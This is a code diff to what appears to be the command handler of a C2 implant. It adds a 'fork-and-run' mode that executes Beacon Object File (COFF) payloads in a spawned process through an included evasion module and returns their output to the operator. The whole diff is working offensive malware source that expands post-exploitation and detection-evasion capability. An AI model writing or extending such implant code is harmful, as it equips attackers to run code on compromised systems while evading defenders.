@@ -3,8 +3,10 @@
 
 #include "commands.h"
 #include "coff.h"
+#include "evasion/fork_and_run.h"
 
 VOID cmd_inline_execute(PINSTANCE inst, PPARSER args, PPACKAGE response) {
+    DWORD fork_flag = parser_int32(args);
     DWORD coff_len = 0;
     BYTE* coff_data = parser_bytes(args, &coff_len);
 
@@ -16,6 +18,31 @@ VOID cmd_inline_execute(PINSTANCE inst, PPARSER args, PPACKAGE response) {
 
     DWORD arg_len = 0;
     BYTE* arg_data = parser_bytes(args, &arg_len);
+
+    // ---- Fork-and-run path ----
+    if (fork_flag) {
+        DBG(inst, "[ES] cmd_inline_execute [fork-and-run]");
+        BYTE* output = NULL;
+        DWORD output_len = 0;
+
+        if (!fork_run_bof(inst, coff_data, coff_len, arg_data, arg_len,
+                          &output, &output_len)) {
+            package_add_string(inst, response,
+                XSTR("fork-and-run failed (no spawnto configured or BOF stub not built)"));
+            response->is_error = TRUE;
+            return;
+        }
+
+        if (output && output_len > 0) {
+            package_add_bytes(inst, response, output, output_len);
+            es_free(inst, output);
+        } else {
+            package_add_string(inst, response, XSTR("(no output)"));
+        }
+        return;
+    }
+
+    // ---- Inline path (original) ----
 
     char*  output     = NULL;
     DWORD  output_len = 0;
